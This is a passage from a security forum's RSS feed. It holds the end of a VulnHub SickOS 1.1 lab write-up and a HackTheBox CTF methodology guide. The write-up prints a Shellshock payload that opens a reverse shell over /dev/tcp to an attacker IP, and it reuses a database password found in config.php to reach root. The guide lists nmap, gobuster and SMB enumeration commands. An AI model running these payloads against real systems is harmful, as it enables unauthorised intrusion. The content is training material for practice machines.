sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash
mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
</code></pre>
<p>Aha~ our request is accepted and it shows us the content of <code>etc/passwd</code> file.</p>
<p>Now, we can make reverse shell connection with this vuln like PHP reverse shell before. Doing simple reverse shell with <code>/bin/bash -i &gt;&amp; /dev/tcp/attacker_ip/attacker_port 0&gt;&amp;1</code></p>
<pre><code class="lang-auto">↳ wget -qO- -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/bash -i &gt;&amp; /dev/tcp/192.168.43.94/4443 0&gt;&amp;1" -e use_proxy=yes -e http_proxy=192.168.43.202:3128 http://192.168.43.202/cgi-bin/status
</code></pre>
<p>Uhuuu reverse shell again!</p>
<pre><code class="lang-auto">↳ nc -lvp 4443
Listening on [0.0.0.0] (family 0, port 4443)
Connection from 192.168.43.202 44354 received!
bash: no job control in this shell
www-data@SickOs:/usr/lib/cgi-bin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@SickOs:/usr/lib/cgi-bin$ 
</code></pre>
<p><strong>Post Exploitation</strong></p>
<p>In this section, we are going to escalating privilege from www-data to root privilege because the flag in the root directory as mentioned in instruction:</p>
<pre><code class="lang-auto">Get /root/a0216ea4d51874464078c618298b1367.txt
</code></pre>
<p>Searching for interesting file and credential in <code>/var/www/</code> .</p>
<pre><code class="lang-auto">www-data@SickOs:/var/www$ cd /var/www
cd /var/www
www-data@SickOs:/var/www$ ls -lah
ls -lah
total 24K
drwxrwxrwx  3 root root 4.0K Dec  6  2015 .
drwxr-xr-x 13 root root 4.0K Dec  6  2015 ..
-rwxrwxrwx  1 root root  109 Dec  5  2015 connect.py
-rw-r--r--  1 root root   21 Dec  5  2015 index.php
-rw-r--r--  1 root root   45 Dec  5  2015 robots.txt
drwxr-xr-x  5 root root 4.0K Dec  5  2015 wolfcms
www-data@SickOs:/var/www$ 
</code></pre>
<pre><code class="lang-auto">www-data@SickOs:/var/www$ cd wolfcms
cd wolfcms
www-data@SickOs:/var/www/wolfcms$ ls -lah
ls -lah
total 52K
drwxr-xr-x 5 root root 4.0K Dec  5  2015 .
drwxrwxrwx 3 root root 4.0K Dec  6  2015 ..
-rwxr-xr-x 1 root root  950 Dec  5  2015 .htaccess
-rwxrwxrwx 1 root root 4.0K Dec  5  2015 CONTRIBUTING.md
-rwxrwxrwx 1 root root 2.4K Dec  5  2015 README.md
-rwxrwxrwx 1 root root  403 Dec  5  2015 composer.json
-rwxrwxrwx 1 root root 3.0K Dec  5  2015 config.php
drwxrwxrwx 2 root root 4.0K Dec  5  2015 docs
-rwxrwxrwx 1 root root  894 Dec  5  2015 favicon.ico
-rwxrwxrwx 1 root root 6.7K Dec  5  2015 index.php
drwxrwxrwx 4 root root 4.0K Dec  6  2015 public
-rwxrwxrwx 1 root root    0 Dec  5  2015 robots.txt
drwxrwxrwx 7 root root 4.0K Dec  5  2015 wolf
www-data@SickOs:/var/www/wolfcms$ 
</code></pre>
<p>Trying to read wolfcms <code>config.php</code> and it showing us database connection for the website.</p>
<pre><code class="lang-auto">www-data@SickOs:/var/www/wolfcms$ cat config.php
cat config.php
&lt;?php 

// Database information:
// for SQLite, use sqlite:/tmp/wolf.db (SQLite 3)
// The path can only be absolute path or :memory:
// For more info look at: www.php.net/pdo

// Database settings:
define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
define('DB_USER', 'root');
define('DB_PASS', 'john@123');
define('TABLE_PREFIX', '');

// Should Wolf produce PHP error messages for debugging?
define('DEBUG', false);

// Should Wolf check for updates on Wolf itself and the installed plugins?
define('CHECK_UPDATES', true);

// The number of seconds before the check for a new Wolf version times out in case of problems.
define('CHECK_TIMEOUT', 3);

// The full URL of your Wolf CMS install
define('URL_PUBLIC', '/wolfcms/');

// Use httpS for the backend?
// Before enabling this, please make sure you have a working HTTP+SSL installation.
define('USE_HTTPS', false);

// Use HTTP ONLY setting for the Wolf CMS authentication cookie?
// This requests browsers to make the cookie only available through HTTP, so not javascript for example.
// Defaults to false for backwards compatibility.
define('COOKIE_HTTP_ONLY', false);

// The virtual directory name for your Wolf CMS administration section.
define('ADMIN_DIR', 'admin');

// Change this setting to enable mod_rewrite. Set to "true" to remove the "?" in the URL.
// To enable mod_rewrite, you must also change the name of "_.htaccess" in your
// Wolf CMS root directory to ".htaccess"
define('USE_MOD_REWRITE', false);

// Add a suffix to pages (simluating static pages '.html')
define('URL_SUFFIX', '.html');

// Set the timezone of your choice.
// Go here for more information on the available timezones:
// http://php.net/timezones
define('DEFAULT_TIMEZONE', 'Asia/Calcutta');

// Use poormans cron solution instead of real one.
// Only use if cron is truly not available, this works better in terms of timing
// if you have a lot of traffic.
define('USE_POORMANSCRON', false);

// Rough interval in seconds at which poormans cron should trigger.
// No traffic == no poormans cron run.
define('POORMANSCRON_INTERVAL', 3600);

// How long should the browser remember logged in user?
// This relates to Login screen "Remember me for xxx time" checkbox at Backend Login screen
// Default: 1800 (30 minutes)
define ('COOKIE_LIFE', 1800);  // 30 minutes

// Can registered users login to backend using their email address?
// Default: false
define ('ALLOW_LOGIN_WITH_EMAIL', false);

// Should Wolf CMS block login ability on invalid password provided?
// Default: true
define ('DELAY_ON_INVALID_LOGIN', true);

// How long should the login blockade last?
// Default: 30 seconds
define ('DELAY_ONCE_EVERY', 30); // 30 seconds

// First delay starts after Nth failed login attempt
// Default: 3
define ('DELAY_FIRST_AFTER', 3);

// Secure token expiry time (prevents CSRF attacks, etc.)
// If backend user does nothing for this time (eg. click some link) 
// his token will expire with appropriate notification
// Default: 900 (15 minutes)
define ('SECURE_TOKEN_EXPIRY', 900);  // 15 minutes
</code></pre>
<p>From <code>/etc/passwd/</code> we know that <strong>sickos</strong> user exists in this machine. Trying to su with a credential from the database connection.</p>
<pre><code class="lang-auto">www-data@SickOs:/usr/lib/cgi-bin$ su sickos
su sickos
su: must be run from a terminal
www-data@SickOs:/usr/lib/cgi-bin$ python -c 'import pty; pty.spawn("/bin/bash")'
&lt;i-bin$ python -c 'import pty; pty.spawn("/bin/bash")'                       
www-data@SickOs:/usr/lib/cgi-bin$ su sickos
su sickos
Password: john@123

sickos@SickOs:/usr/lib/cgi-bin$ id
id
uid=1000(sickos) gid=1000(sickos) groups=1000(sickos),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
</code></pre>
<p>Hm… cannot doing su because we are not running from terminal, we need to spawn tty with bash session. After that, su again and it showing us id is changed to sickos from www-data.</p>
<p>Escalating privilege with misconfigured <code>sudo</code> .</p>
<pre><code class="lang-auto">sickos@SickOs:/usr/lib/cgi-bin$ sudo -l
sudo -l
[sudo] password for sickos: john@123

Matching Defaults entries for sickos on this host:
    env_reset,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sickos may run the following commands on this host:
    (ALL : ALL) ALL
sickos@SickOs:/usr/lib/cgi-bin$ sudo su
sudo su
root@SickOs:/usr/lib/cgi-bin# 
</code></pre>
<p>In the end, we can access flag file as mentioned in the instruction.</p>
<pre><code class="lang-auto">root@SickOs:/usr/lib/cgi-bin# cd /root 
cd /root
root@SickOs:~# ls -lah
ls -lah
total 40K
drwx------  3 root root 4.0K Dec  6  2015 .
drwxr-xr-x 22 root root 4.0K Sep 22  2015 ..
-rw-r--r--  1 root root   96 Dec  6  2015 redacted-hash.txt
-rw-------  1 root root 3.7K Dec  6  2015 .bash_history
-rw-r--r--  1 root root 3.1K Apr 19  2012 .bashrc
drwx------  2 root root 4.0K Sep 22  2015 .cache
-rw-------  1 root root   22 Dec  5  2015 .mysql_history
-rw-r--r--  1 root root  140 Apr 19  2012 .profile
-rw-------  1 root root 5.2K Dec  6  2015 .viminfo
root@SickOs:~# cat redacted-hash.txt
cat redacted-hash.txt
If you are viewing this!!

ROOT!

You have Succesfully completed SickOS1.1.
Thanks for Trying
</code></pre>
<p><strong>References</strong>:</p>
<ul>
<li><a href="https://g0blin.co.uk/sickos-1-1-vulnhub-writeup/" rel="noopener nofollow ugc">https://g0blin.co.uk/sickos-1-1-vulnhub-writeup/</a></li>
<li><a href="https://www.alternativesec.xyz/vulnhub/2017/02/16/Sick-OS/" rel="noopener nofollow ugc">https://www.alternativesec.xyz/vulnhub/2017/02/16/Sick-OS/</a></li>
<li><a href="http://f4l13n5n0w.github.io/blog/2015/12/24/vulnhub-sickos-1-dot-1/" rel="noopener nofollow ugc">http://f4l13n5n0w.github.io/blog/2015/12/24/vulnhub-sickos-1-dot-1/</a></li>
<li><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" rel="noopener nofollow ugc">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></li>
</ul>
            <p><small>5 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/vulnhub-sickos-1-1-writeup/14799">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/vulnhub-sickos-1-1-writeup/14799</link>
          <pubDate>Sun, 07 Jul 2019 04:49:54 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-14799</guid>
          <source url="https://0x00sec.org/t/vulnhub-sickos-1-1-writeup/14799.rss">[VulnHub] SickOS 1.1 Writeup</source>
        </item>
        <item>
          <title>My HackTheBox CTF Methodology - From fresh box to root!</title>
          <dc:creator><![CDATA[pry0cc]]></dc:creator>
          <category>CTF</category>
          <description><![CDATA[
            <p>Hey 0x00ers!</p>
<p>I’m so sorry that it’s been such a long time since I’ve dropped an article here! I’ve been writing for my current company <a href="http://navisec.io">navisec.io</a> @ <a href="http://delta.navisec.io">delta.navisec.io</a> and I’ve not had the chance to drop a good article for 0x00sec for a little while.</p>
<p>Today that is changing! Whoop!</p>
<p>In this article I’m going to discuss CTF methodology, really, this links in so closely to real life penetration methodology (if you were scoped down to an internal or to a single machine).</p>
<p>Specifically, we’re going to be discussing boot2root CTF’s, things such as HackTheBox.eu, and how I generally go about pwning a box.</p>
<h3>The Basics - what is our objective?</h3>
<p>Usually, the objective of these CTF’s is to obtain a shell, usually unprivileged, and then escalate your privileges to gain access to root. Occasionally this doesn’t necessarily mean you have to obtain a root shell, but be people to read/write files as root, (which with more time could be used to gain a root shell).</p>
<p>As per hackthebox, you usually have these two files known as flags stored on the machine. On Linux machines the “user.txt” flag denotes a user own, and is stored in /home/someusername/user.txt, and on Linux, the “root.txt” flag file is stored in /root/root.txt.</p>
<p>On windows boxes, these files are usually stored in C:\Users\Username\Desktop\user.txt, and C:\Users\Administrator\Desktop\root.txt respectively.</p>
<p>When you gain access to these files, you just need to view the contents (<code>cat</code>/<code>type</code>) and copy the code into the HackTheBox page for that box.</p>
<h3>How do we even start?</h3>
<p>Ok, so now you know what you’re trying to achieve, you need to know where to start.</p>
<p>I recommend now if you’re reading so far, and you are not familiar with basic networking, Linux or Windows basic usage, and scripting languages such as python/ruby, then you’re not ready for CTF’s. For networking <a href="https://www.youtube.com/watch?v=n2D1o-aM-2s">watch this</a> and for Linux <a href="https://www.youtube.com/watch?v=x73WTEltyHU">watch this</a>. Obviously, this is nowhere near enough to get started but it should provide some structure for absolute newbies!</p>
<p>The first stage of hacking is enumeration.</p>
<h3>Enumeration</h3>
<p>Enumeration is the stage where we attempt to collect as much information as we can from the host before even trying to exploit anything. I will easily spend 1-2 hours of enumeration on a medium box. Take your time with this step, never rush this. Go very slow, read everything, save anything and everything in your notes that might be relevant later.</p>
<p>For a quick reference containing everything here, read <a href="https://delta.navisec.io/web-enumeration-reference/">this</a>.</p>
<h4>Port scanning</h4>
<p>Typically in a CTF, I will begin with a portscan.</p>
<p>This is the real nmap scan I use for SwagShop this weekend.</p>
<pre><code class="lang-auto">sudo nmap -v -sS -A -Pn -T5 -p- -oN swagshop.txt 10.10.10.140
</code></pre>
<p>Just to make sure you’re not missing anything a quick UDP scan, since this is so slow I generally won’t wait for it and will just go ahead while it’s running.</p>
<pre><code class="lang-auto">sudo nmap -v -sU -T5 -oN swagshop-udp.txt 10.10.10.140
</code></pre>
<p>You rarely will find UDP ports open &amp; relevant in CTF’s, but they can catch you out (for example Access).</p>
<p>This command will return your nmap results, very often if it’s a Linux box, you’ll end up with a webserver on port 80, maybe 443, and port 22 open. Bruteforcing SSH is rarely fruitful and something I will only ever do if i’m scrabbling for access (I’ve never bruteforced successfully on a HTB before).</p>
<p>Now that you’ve done a network map, you need to enumerate each service. So in our case:</p>
<pre><code class="lang-auto">PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 88733EE53676A47FC354A61C32516E82
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Home page
</code></pre>
<h4>Service Enumeration</h4>
<p>Now I will write down things such as the OpenSSH version, the distribution discovered via this fingerprint. I will also do the same for HTTP. Generally, to ensure I’m not missing anything dumb, I will search <a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a> for these version numbers.</p>
<p>(Tip, if you get a version like OpenSSH 7.2p2, search SSH 7.2, or OpenSSH 7 and look over the results. You might find that the description on the exploit is like “&lt; 7.3”. )</p>
<p>Quite often, I will not find a full on RCE here, if I do spot an RCE, I’ll fire up metasploit and search the software as well. Sometimes there are exploits in here (and vice versa). You’re probably noticing the trend here is “just check in case”. As <span class="mention">@cry0lit3</span> always says, leave no stone unturned.</p>
<p>If you’re on a Windows box, you might find that port 21 is open, port 139, 445 are open. If this is the case, try and connect to FTP (I use ncftp thanks to <a class="mention" href="https://0x00sec.org/u/guly">@guly</a>), note down the version numbers, try and connect with the “Anonymous” user. For 139 and 445, try and enumerate SMB.</p>
<pre><code class="lang-auto">smbclient -L 10.10.10.140
</code></pre>
<p>This will return shares listed in SMB. Once you’ve got a few, use smbclient to try and connect to each one.</p>
<pre><code class="lang-auto">smbclient //10.10.10.140/TheShare
</code></pre>
<p>This will prompt you for a password, you can also specify a username with the -U flag. If your credentials are successful, you will be dropped into an interactive prompt similar to that of FTP and you’ll be able to navigate files and download files.</p>
<p>You can also use the SMB script that comes with nmap,</p>
<pre><code class="lang-auto">nmap -p445 -sV --script smb-enum-services 10.10.10.140
</code></pre>
<p>This script works ok, but it’s best to try both.</p>
<h3>HTTP Enumeration</h3>
<p>A crucial part of lots of hacktheboxes and CTF’s is HTTP enumeration. I love using Burpsuite for this, setup burpsuite and proxy all your requests, if you have pro, do an active spider. Click through the entire website and click everything, every link, the file structure will be populated in the left-hand side of the Burpsuite window. I strongly recommend flipping through each request and nothing things such as the request cookies, the response headers, and scanning through the web source. You might get lucky and find some comments containing a hint!</p>
<p>Now that you’ve completed some level of passive reconnaissance, go in hard with the active. I will generally begin this step before I do passive enum just for the sake of efficiency.</p>
<p>There are many different tools you can use here, but I really like gobuster.</p>
<pre><code class="lang-auto">gobuster -w SecLists/Discovery/Web_Content/big.txt -u http://10.10.10.140/
</code></pre>
<p>You can also chuck in the -x flag and supply some different extensions if the app has a lot of aspx pages I will chuck on <code>-x aspx</code>. Focus this bit depending on what you’re dealing with, is it a NodeJS app? Try <code>-x js,json</code>.  It’s unlikely you’ll find a .php page on a NodeJS app.</p>
<p>For good measure, once I’ve run this and begin investigating further, I will chuck this at it:</p>
<pre><code class="lang-auto">gobuster -w SecLists/Discovery/Web_Content/raft-large-files.txt -u http://10.10.10.140/
</code></pre>
<p>Once I’ve gotten a list of different directories that have been discovered, I will visit them, curl them, and investigate further. Usually, on an easy box, you’ll find something you might be able to exploit here, or maybe just more hints!</p>
<p>What you find might happen is that the developer has been crafty and enabled wildcard directories. This is a common thing on harder boxes and you will often notice that this the developer’s way of telling you “its not by dirbusting!”. Sometimes, though, they might hide something inside this, maybe a comment or a page with a 404 not found status code, but with something inside the source, you can use burp intruder and examine the response lengths if you feel this might be the case.</p>
<p>Again - examine all of your traffic through Burp, its so invaluable to be able to read the source. Doing this would of gotten me a foothold on OneTwoSeven so much quicker!</p>
<h4>Finding subdomains with SSL certs</h4>
<p>If you find that port 443 is open, or an SSL port is open, you might be able to leverage this to get yourself some subdomains! You can either click on the cert and navigate and read all the information until you find some other valid certnames.</p>
<p>Or you can use this one-liner, (I recommend doing both though).</p>
<pre><code class="lang-auto">echo | openssl s_client -connect 0x00sec.org:443  | openssl x509 -noout -text | grep DNS | sed 's/,/\n/g'
</code></pre>
<p>Once you’ve got these, put them in your hosts file or try and request with curl:</p>
<pre><code class="lang-auto">curl -vv 'Host: yournewdomain.com' 10.10.10.40
</code></pre>
<p>You might get lucky! If you want to bruteforce these, you can use the <code>auxiliary/scanner/http/vhost_scanner</code> module in Metasploit.</p>
<h3>Exploitation</h3>
<p>Now that you’ve enumerated a bunch, and hopefully organized this into a nice set of notes (I usually just use a text file), I recommend (taking your time), and going over the data you’ve collected. Focus on trying to use your current gathered information to gain and gather more information. Perhaps you read some text on the website that suggested the username or potential name of the fictional user of the system.</p>
<p>If you’ve obtained creds, try them everywhere! And note down that you’ve tried them. Noting down what you’ve tried and being methodical is so useful.</p>
<p>Now after you’ve reviewed your notes, you will likely find that something pops into your head; an “OH OF COURSE” moment. If you’ve done your enumeration well enough, you should see the path that has been laid out for you pretty clearly. Whether that is a vulnerable webapp, a wordpress instance located in a sub path, a status page giving you more information, an LDAP instance that is leaking hashes (that you can crack!), an LFI that you can get ssh private keys from!</p>
<p>Try and think through what the app does, what the system is, and how it works. Where is it communicating? How did the developer design this? How might this be vulnerable?</p>
<p>Once you’ve found this path, try and exploit it. Depending on the difficulty of the box, you might need to spend a little while on this. Google is your best friend! If you’re really struggling, you can look over some hints from the HackTheBox forums, but remember, if you’re planning on doing the OSCP, you won’t get the luxury of these hints. Usually, this involves getting a shell, for a quick shell reference <a href="https://delta.navisec.io/reverse-shell-reference/">this</a> can be very helpful.</p>
<h3>Getting the Root!</h3>
<p>Now really, since this is not intended to be an exhaustive article on enumeration, but more of a quick overview of CTF methodology. I won’t go too deep into rooting and privesc. The metholodgy is exactly the same for me. Collect as much information as possible, organize your collected data and then the path should reveal itself.</p>
<p>If you want a privesc reference, check <a href="https://delta.navisec.io/privilege-escalation/%5D">this</a> out!</p>
<h3>Conclusion</h3>
<p>In conclusion, the methodology of gaining access to a CTF box contains a few steps:</p>
<ul>
<li>Information gathering</li>
<li>More information gathering</li>
<li>Review your collected information</li>
<li>Exploit the path that you’ve been shown by the hacker gods</li>
<li>Repeat</li>
</ul>
<p>It’s dead easy when you think about it like this, and really taking your time is invaluable. If you don’t see a path, just keep enumerating. You’ll find something, it just might take a LOT of enumeration. In many ways, knowing the path to exploitation but just struggling on the actual exploitation execution is a really rewarding feeling, because finding that flaw to exploit is literally half the battle.</p>
<p>I hope this was helpful, and not too scrappy, this was thrown together in a mad blaze of creativity before my workday. If you spot any typo’s let me know and I’ll fix it.</p>
<p>What does your CTF methodology look like? Do you have a different approach or tips for others on this topic? Please let me know!</p>
<p>Thanks, 0x00ers!</p>
<p>Stay snappy <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
            <p><small>22 posts - 11 participants</small></p>
            <p><a href="https://0x00sec.org/t/my-hackthebox-ctf-methodology-from-fresh-box-to-root/13980">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/my-hackthebox-ctf-methodology-from-fresh-box-to-root/13980</link>
          <pubDate>Tue, 28 May 2019 12:35:19 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-13980</guid>
          <source url="https://0x00sec.org/t/my-hackthebox-ctf-methodology-from-fresh-box-to-root/13980.rss">My HackTheBox CTF Methodology - From fresh box to root!</source>
        </item>
  </channel>
</rss>
